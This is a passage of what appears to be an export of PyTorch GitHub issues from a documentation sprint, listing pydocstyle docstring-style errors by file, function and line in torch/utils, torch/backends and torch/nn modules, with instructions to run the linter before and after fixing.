- **File**: `torch/utils/cpp_extension.py`, **Entity**: `with_options`, **Line**: 457, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `CppExtension`, **Line**: 908, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `CppExtension`, **Line**: 908, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `CUDAExtension`, **Line**: 954, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `CUDAExtension`, **Line**: 954, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `include_paths`, **Line**: 1125, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `library_paths`, **Line**: 1159, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `load`, **Line**: 1206, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `load`, **Line**: 1206, **Description**: First line should be in imperative mood (perhaps 'Load', not 'Loads')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `load_inline`, **Line**: 1315, **Description**: First line should be in imperative mood (perhaps 'Load', not 'Loads')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `is_ninja_available`, **Line**: 1633, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `is_ninja_available`, **Line**: 1633, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `is_ninja_available`, **Line**: 1633, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `is_ninja_available`, **Line**: 1633, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `verify_ninja_availability`, **Line**: 1646, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `verify_ninja_availability`, **Line**: 1646, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `verify_ninja_availability`, **Line**: 1646, **Description**: First line should end with a period (not 't')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `verify_ninja_availability`, **Line**: 1646, **Description**: First line should be in imperative mood (perhaps 'Raise', not 'Raises')
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `_get_cuda_arch_flags`, **Line**: 1719, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `_join_cuda_home`, **Line**: 2231, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/cpp_extension.py`, **Entity**: `_join_cuda_home`, **Line**: 2231, **Description**: First line should be in imperative mood (perhaps 'Join', not 'Joins')
- **File**: `torch/utils/flop_counter.py`, **Entity**: `mm_flop`, **Line**: 20, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `addmm_flop`, **Line**: 32, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `addmm_flop`, **Line**: 32, **Description**: First line should end with a period (not 'm')
- **File**: `torch/utils/flop_counter.py`, **Entity**: `bmm_flop`, **Line**: 38, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `baddbmm_flop`, **Line**: 52, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `conv_flop_count`, **Line**: 66, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `conv_flop_count`, **Line**: 66, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/flop_counter.py`, **Entity**: `conv_flop`, **Line**: 89, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `sdpa_flop_count`, **Line**: 122, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `sdpa_flop`, **Line**: 140, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `sdpa_backward_flop`, **Line**: 175, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `FlopCounterMode`, **Line**: 218, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `FlopCounterMode`, **Line**: 218, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `FlopCounterMode`, **Line**: 218, **Description**: First line should end with a period (not 'f')
- **File**: `torch/utils/flop_counter.py`, **Entity**: `get_flop_counts`, **Line**: 329, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/flop_counter.py`, **Entity**: `get_flop_counts`, **Line**: 329, **Description**: First line should end with a period (not 'r')
- **File**: `torch/utils/flop_counter.py`, **Entity**: `get_flop_counts`, **Line**: 329, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/_foreach_utils.py`, **Entity**: `_get_foreach_kernels_supported_devices`, **Line**: 8, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/_foreach_utils.py`, **Entity**: `_get_fused_kernels_supported_devices`, **Line**: 14, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/_python_dispatch.py`, **Entity**: `TorchDispatchMode`, **Line**: 17, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/_python_dispatch.py`, **Entity**: `TorchDispatchMode`, **Line**: 17, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_python_dispatch.py`, **Entity**: `TorchDispatchMode`, **Line**: 17, **Description**: First line should end with a period (not 'l')
- **File**: `torch/utils/_pytree.py`, **Entity**: `tree_flatten`, **Line**: 271, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_pytree.py`, **Entity**: `tree_flatten`, **Line**: 271, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/_pytree.py`, **Entity**: `tree_unflatten`, **Line**: 293, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_pytree.py`, **Entity**: `map_only`, **Line**: 352, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_pytree.py`, **Entity**: `map_only`, **Line**: 352, **Description**: First line should end with a period (not 'g')
- **File**: `torch/utils/backend_registration.py`, **Entity**: `rename_privateuse1_backend`, **Line**: 14, **Description**: Docstring is over-indented
- **File**: `torch/utils/backend_registration.py`, **Entity**: `rename_privateuse1_backend`, **Line**: 14, **Description**: First line should end with a period (not 'e')
- **File**: `torch/utils/backend_registration.py`, **Entity**: `rename_privateuse1_backend`, **Line**: 14, **Description**: First line should not be the function's ""signature""
- **File**: `torch/utils/backend_registration.py`, **Entity**: `wrap_tensor_to`, **Line**: 137, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/utils/backend_registration.py`, **Entity**: `wrap_module_to`, **Line**: 169, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **File**: `torch/utils/backend_registration.py`, **Entity**: `wrap_storage_backend`, **Line**: 193, **Description**: First line should end with a period (not '`')
- **File**: `torch/utils/backend_registration.py`, **Entity**: `wrap_storage_backend`, **Line**: 193, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/backend_registration.py`, **Entity**: `wrap_storage_to`, **Line**: 200, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/backend_registration.py`, **Entity**: `generate_methods_for_privateuse1_backend`, **Line**: 260, **Description**: Docstring is over-indented
- **File**: `torch/utils/backend_registration.py`, **Entity**: `generate_methods_for_privateuse1_backend`, **Line**: 260, **Description**: First line should end with a period (not 'e')
- **File**: `torch/utils/backend_registration.py`, **Entity**: `generate_methods_for_privateuse1_backend`, **Line**: 260, **Description**: First line should not be the function's ""signature""
- **File**: `torch/utils/checkpoint.py`, **Entity**: `DefaultDeviceType`, **Line**: 70, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/checkpoint.py`, **Entity**: `DefaultDeviceType`, **Line**: 70, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/checkpoint.py`, **Entity**: `checkpoint`, **Line**: 300, **Description**: First line should end with a period (not 'l')
- **File**: `torch/utils/checkpoint.py`, **Entity**: `checkpoint_sequential`, **Line**: 444, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **File**: `torch/utils/checkpoint.py`, **Entity**: `set_checkpoint_early_stop`, **Line**: 663, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/checkpoint.py`, **Entity**: `set_checkpoint_early_stop`, **Line**: 663, **Description**: First line should end with a period (not 'n')
- **File**: `torch/utils/checkpoint.py`, **Entity**: `_checkpoint_without_reentrant`, **Line**: 1089, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/checkpoint.py`, **Entity**: `_checkpoint_without_reentrant`, **Line**: 1089, **Description**: First line should end with a period (not 'd')

cc @carljparker",False
"Fix docstring errors in throughput_benchmark.py, weak.py, _traceback.py, file_baton.py, _contextlib.py, _device.py, cpp_backtrace.py, bundled_inputs.py, run_cpu.py, hooks.py, mobile_optimizer.py, _freeze.py, __init__.py, mkldnn.py, dlpack.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/backends/mps/__init__.py`, **Entity**: `is_built`, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/mps/__init__.py`, **Entity**: `is_built`, **Line**: 9, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/backends/mps/__init__.py`, **Entity**: `is_built`, **Line**: 9, **Description**: First line should end with a period (not 's')
- **File**: `torch/backends/mps/__init__.py`, **Entity**: `is_built`, **Line**: 9, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/mps/__init__.py`, **Entity**: `is_available`, **Line**: 18, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/mps/__init__.py`, **Entity**: `is_macos13_or_newer`, **Line**: 24, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/mps/__init__.py`, **Entity**: `_init`, **Line**: 30, **Description**: First line should end with a period (not 'm')
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `_CPUinfo`, **Line**: 142, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `_CPUinfo`, **Line**: 142, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `numa_aware_check`, **Line**: 224, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `_Launcher`, **Line**: 243, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `_Launcher`, **Line**: 243, **Description**: Docstring is over-indented
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `_Launcher`, **Line**: 243, **Description**: First line should end with a period (not 'r')
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `add_lib_preload`, **Line**: 255, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `add_lib_preload`, **Line**: 255, **Description**: First line should end with a period (not 'P')
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `set_memory_allocator`, **Line**: 298, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `set_multi_thread_and_allocator`, **Line**: 363, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `create_args`, **Line**: 617, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `create_args`, **Line**: 617, **Description**: First line should end with a period (not 's')
- **File**: `torch/backends/xeon/run_cpu.py`, **Entity**: `create_args`, **Line**: 617, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **File**: `torch/backends/opt_einsum/__init__.py`, **Entity**: `is_available`, **Line**: 16, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/opt_einsum/__init__.py`, **Entity**: `get_opt_einsum`, **Line**: 21, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/backends/cpu/__init__.py`, **Entity**: `get_cpu_capability`, **Line**: 7, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/cpp_backtrace.py`, **Entity**: `get_cpp_backtrace`, **Line**: 4, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/utils/cpp_backtrace.py`, **Entity**: `get_cpp_backtrace`, **Line**: 4, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/cpp_backtrace.py`, **Entity**: `get_cpp_backtrace`, **Line**: 4, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/utils/_contextlib.py`, **Entity**: `context_decorator`, **Line**: 70, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/utils/_contextlib.py`, **Entity**: `context_decorator`, **Line**: 70, **Description**: First line should end with a period (not '
- **File**: `torch/utils/_contextlib.py`, **Entity**: `_DecoratorContextManager`, **Line**: 121, **Description**: First line should end with a period (not 'r')
- **File**: `torch/utils/_device.py`, **Entity**: `set_device`, **Line**: 83, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_device.py`, **Entity**: `set_device`, **Line**: 83, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/_device.py`, **Entity**: `set_device`, **Line**: 83, **Description**: First line should be in imperative mood (perhaps 'Decorate', not 'Decorator')
- **File**: `torch/utils/_freeze.py`, **Entity**: `write_bytecode`, **Line**: 119, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_freeze.py`, **Entity**: `write_bytecode`, **Line**: 119, **Description**: First line should end with a period (not 'n')
- **File**: `torch/utils/_freeze.py`, **Entity**: `write_main`, **Line**: 135, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_freeze.py`, **Entity**: `write_main`, **Line**: 135, **Description**: First line should end with a period (not 'e')
- **File**: `torch/utils/_freeze.py`, **Entity**: `write_frozen`, **Line**: 153, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/_freeze.py`, **Entity**: `compile_path`, **Line**: 164, **Description**: First line should be in imperative mood; try rephrasing (found 'Generic')
- **File**: `torch/utils/_freeze.py`, **Entity**: `compile_file`, **Line**: 222, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_freeze.py`, **Entity**: `compile_file`, **Line**: 222, **Description**: First line should end with a period (not 'o')
- **File**: `torch/utils/bundled_inputs.py`, **Entity**: `InflatableArg`, **Line**: 14, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/bundled_inputs.py`, **Entity**: `InflatableArg`, **Line**: 14, **Description**: No whitespaces allowed surrounding docstring text
- **File**: `torch/utils/bundled_inputs.py`, **Entity**: `bundle_inputs`, **Line**: 45, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/bundled_inputs.py`, **Entity**: `bundle_inputs`, **Line**: 45, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/bundled_inputs.py`, **Entity**: `bundle_inputs`, **Line**: 45, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/bundled_inputs.py`, **Entity**: `augment_model_with_bundled_inputs`, **Line**: 132, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/utils/bundled_inputs.py`, **Entity**: `augment_model_with_bundled_inputs`, **Line**: 132, **Description**: No whitespaces allowed surrounding docstring text
- **File**: `torch/utils/dlpack.py`, **Entity**: `from_dlpack`, **Line**: 50, **Description**: First line should end with a period (not 'r')
- **File**: `torch/utils/dlpack.py`, **Entity**: `from_dlpack`, **Line**: 50, **Description**: First line should not be the function's ""signature""
- **File**: `torch/utils/file_baton.py`, **Entity**: `FileBaton`, **Line**: 6, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/file_baton.py`, **Entity**: `__init__`, **Line**: 9, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/file_baton.py`, **Entity**: `__init__`, **Line**: 9, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/utils/file_baton.py`, **Entity**: `try_acquire`, **Line**: 22, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/file_baton.py`, **Entity**: `try_acquire`, **Line**: 22, **Description**: First line should be in imperative mood (perhaps 'Try', not 'Tries')
- **File**: `torch/utils/file_baton.py`, **Entity**: `wait`, **Line**: 35, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/file_baton.py`, **Entity**: `release`, **Line**: 45, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/hooks.py`, **Entity**: `unserializable_hook`, **Line**: 73, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/hooks.py`, **Entity**: `unserializable_hook`, **Line**: 73, **Description**: First line should be in imperative mood (perhaps 'Decorate', not 'Decorator')
- **File**: `torch/utils/hooks.py`, **Entity**: `BackwardHook`, **Line**: 93, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/mkldnn.py`, **Entity**: `_MkldnnConvNd`, **Line**: 37, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/utils/mkldnn.py`, **Entity**: `_MkldnnConvNd`, **Line**: 37, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/mobile_optimizer.py`, **Entity**: ``, **Line**: 1, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/mobile_optimizer.py`, **Entity**: `optimize_for_mobile`, **Line**: 21, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/mobile_optimizer.py`, **Entity**: `optimize_for_mobile`, **Line**: 21, **Description**: First line should end with a period (not '
- **File**: `torch/utils/mobile_optimizer.py`, **Entity**: `generate_mobile_module_lints`, **Line**: 80, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/mobile_optimizer.py`, **Entity**: `generate_mobile_module_lints`, **Line**: 80, **Description**: First line should end with a period (not '
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `format_time`, **Line**: 6, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `format_time`, **Line**: 6, **Description**: First line should end with a period (not 'e')
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `format_time`, **Line**: 6, **Description**: First line should be in imperative mood (perhaps 'Define', not 'Defines')
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `iters_per_second`, **Line**: 42, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `iters_per_second`, **Line**: 42, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `iters_per_second`, **Line**: 42, **Description**: First line should end with a period (not 's')
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `ThroughputBenchmark`, **Line**: 62, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `ThroughputBenchmark`, **Line**: 62, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `ThroughputBenchmark`, **Line**: 62, **Description**: First line should end with a period (not 'k')
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `run_once`, **Line**: 103, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `run_once`, **Line**: 103, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `add_input`, **Line**: 112, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `add_input`, **Line**: 112, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `add_input`, **Line**: 112, **Description**: First line should end with a period (not 't')
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `benchmark`, **Line**: 126, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `benchmark`, **Line**: 126, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/utils/throughput_benchmark.py`, **Entity**: `benchmark`, **Line**: 126, **Description**: First line should end with a period (not '
- **File**: `torch/utils/weak.py`, **Entity**: `TensorWeakRef`, **Line**: 273, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/weak.py`, **Entity**: `TensorWeakRef`, **Line**: 273, **Description**: First line should end with a period (not 'd')
- **File**: `torch/utils/_traceback.py`, **Entity**: `shorten_filename`, **Line**: 133, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_traceback.py`, **Entity**: `shorten_filename`, **Line**: 133, **Description**: First line should end with a period (not '/')
- **File**: `torch/utils/_traceback.py`, **Entity**: `format_frame`, **Line**: 142, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/utils/_traceback.py`, **Entity**: `format_frame`, **Line**: 142, **Description**: First line should end with a period (not 'h')
- **File**: `torch/utils/_traceback.py`, **Entity**: `format_traceback_short`, **Line**: 149, **Description**: One-line docstring should fit on one line with quotes (found 3)

cc @carljparker",False
"Fix docstring errors in expanded_weights_utils.py, linear_fused.py, prepare.py, serializer.py, utils.py, batchnorm.py, functional_modules.py, conv_utils.py, linear_relu.py, activation.py, conv.py, normalization.py, dropout.py, linear.py, functional.py, convert_parameters.py, __init__.py, embedding_ops.py, conv_fused.py, sparse.py, rnn.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/nn/utils/convert_parameters.py`, **Entity**: `parameters_to_vector`, **Line**: 6, **Description**: First line should end with a period (not 'r')
- **File**: `torch/nn/utils/convert_parameters.py`, **Entity**: `vector_to_parameters`, **Line**: 28, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/convert_parameters.py`, **Entity**: `_check_param_device`, **Line**: 58, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/utils/convert_parameters.py`, **Entity**: `_check_param_device`, **Line**: 58, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/convert_parameters.py`, **Entity**: `_check_param_device`, **Line**: 58, **Description**: First line should end with a period (not 'd')
- **File**: `torch/nn/utils/convert_parameters.py`, **Entity**: `_check_param_device`, **Line**: 58, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `PackedSequence`, **Line**: 28, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `to`, **Line**: 119, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `to`, **Line**: 119, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `is_cuda`, **Line**: 146, **Description**: First line should end with a period (not 'u')
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `is_pinned`, **Line**: 150, **Description**: First line should end with a period (not 'y')
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `is_pinned`, **Line**: 150, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `pad_packed_sequence`, **Line**: 274, **Description**: First line should be in imperative mood (perhaps 'Pad', not 'Pads')
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `pad_sequence`, **Line**: 347, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `pad_sequence`, **Line**: 347, **Description**: First line should end with a period (not '`')
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `unpad_sequence`, **Line**: 408, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `unpad_sequence`, **Line**: 408, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `pack_sequence`, **Line**: 454, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `unpack_sequence`, **Line**: 490, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/utils/rnn.py`, **Entity**: `unpack_sequence`, **Line**: 490, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/utils/_expanded_weights/expanded_weights_utils.py`, **Entity**: `standard_kwargs`, **Line**: 19, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_expanded_weights/expanded_weights_utils.py`, **Entity**: `standard_kwargs`, **Line**: 19, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/nn/utils/_expanded_weights/expanded_weights_utils.py`, **Entity**: `standard_kwargs`, **Line**: 19, **Description**: First line should end with a period (not 'e')
- **File**: `torch/nn/utils/_expanded_weights/expanded_weights_utils.py`, **Entity**: `forward_helper`, **Line**: 28, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_expanded_weights/expanded_weights_utils.py`, **Entity**: `forward_helper`, **Line**: 28, **Description**: Use """"""triple double quotes"""""" (found '''-quotes)
- **File**: `torch/nn/utils/_expanded_weights/expanded_weights_utils.py`, **Entity**: `forward_helper`, **Line**: 28, **Description**: First line should end with a period (not ')')
- **File**: `torch/nn/utils/_expanded_weights/expanded_weights_utils.py`, **Entity**: `sum_over_all_but_batch_and_last_n`, **Line**: 123, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_expanded_weights/expanded_weights_utils.py`, **Entity**: `sum_over_all_but_batch_and_last_n`, **Line**: 123, **Description**: First line should end with a period (not 't')
- **File**: `torch/nn/utils/_expanded_weights/expanded_weights_utils.py`, **Entity**: `sum_over_all_but_batch_and_last_n`, **Line**: 123, **Description**: First line should be in imperative mood (perhaps 'Calculate', not 'Calculates')
- **File**: `torch/nn/utils/_expanded_weights/conv_utils.py`, **Entity**: `unfold3d`, **Line**: 189, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/nn/utils/_expanded_weights/conv_utils.py`, **Entity**: `unfold3d`, **Line**: 189, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/nn/utils/_expanded_weights/conv_utils.py`, **Entity**: `unfold3d`, **Line**: 189, **Description**: First line should be in imperative mood (perhaps 'Extract', not 'Extracts')
- **File**: `torch/nn/quantized/functional.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'l')
- **File**: `torch/nn/quantized/modules/activation.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/batchnorm.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/conv.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/dropout.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/embedding_ops.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/functional_modules.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/linear.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/normalization.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/rnn.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/__init__.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/modules/utils.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/dynamic/modules/__init__.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
- **File**: `torch/nn/quantized/dynamic/modules/conv.py`, **Entity**: ``, **Line**: 2, **Description**: First line should end with a period (not 's')
